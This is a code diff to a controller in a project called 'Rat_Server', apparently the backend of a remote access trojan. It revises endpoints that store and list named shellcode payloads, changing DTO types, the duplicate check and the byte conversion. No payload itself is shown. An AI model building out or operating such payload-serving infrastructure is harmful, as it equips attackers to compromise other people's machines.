@@ -8,6 +8,7 @@ using Rat_Server.Model.Context;
 using Rat_Server.Model.DTOs;
 using Rat_Server.Model.Entities;
 using System.Net;
+using Rat_Server.Migrations;
 
 namespace Rat_Server.Controllers
 {
@@ -47,14 +48,14 @@ namespace Rat_Server.Controllers
         [HttpPost("AddShellCode")]
         [ProducesResponseType(StatusCodes.Status201Created)]
         [ProducesResponseType(StatusCodes.Status409Conflict)]
-        public async Task<ActionResult> AddShellCode([FromBody] ShellCodeDto shellCodeDto)
+        public async Task<ActionResult> AddShellCode([FromBody] AddShellCodeDto shellCodeDto)
         {
             if (!ModelState.IsValid)
             {
                 return StatusCode(StatusCodes.Status400BadRequest);
             }
 
-            if(_context.ShellCodes.Single(b => b.Name == shellCodeDto.Name) != null)
+            if(await _context.ShellCodes.CountAsync(b => b.Name == shellCodeDto.Name) > 0)
             {
                 return StatusCode(StatusCodes.Status409Conflict);
             }
@@ -64,7 +65,7 @@ namespace Rat_Server.Controllers
                 await _context.ShellCodes.AddAsync(new ShellCode
                 {
                     Name = shellCodeDto.Name,
-                    Code = ShellCodeConverter.ToByteArray(shellCodeDto.Code)
+                    Code = ShellCodeConverter.ToShellCodeByteArray(shellCodeDto.Code)
                 });
 
                 await _context.SaveChangesAsync();
@@ -78,14 +79,23 @@ namespace Rat_Server.Controllers
         }
 
         [HttpGet("GetAllShellCode")]
-        [ProducesResponseType(typeof(List<ShellCodeDto>), StatusCodes.Status200OK)]
-        public async Task<ActionResult<List<ShellCodeDto>>> GetAllShellCode()
+        [ProducesResponseType(typeof(List<AddShellCodeDto>), StatusCodes.Status200OK)]
+        public async Task<ActionResult<List<AddShellCodeDto>>> GetAllShellCode()
         {
-            return await _context.ShellCodes.Select(b => new ShellCodeDto
+            List<AddShellCodeDto> shellCodes = new List<AddShellCodeDto>();
+            
+            foreach(ShellCode shellCodeEntity in await _context.ShellCodes.ToListAsync())
             {
-                Name = b.Name,
-                Code = Convert.ToString(b.Code)
-            }).ToListAsync();
+                shellCodes.Add(new AddShellCodeDto
+                {
+                    Name = shellCodeEntity.Name,
+                    Code = ShellCodeConverter.ToShellCodeString(shellCodeEntity.Code)
+                });
+            }
+
+            return Ok(shellCodes);
+
+            // TODO: Change it so it doesn't send back AddShellCodeDto objects
         }
     }
 }
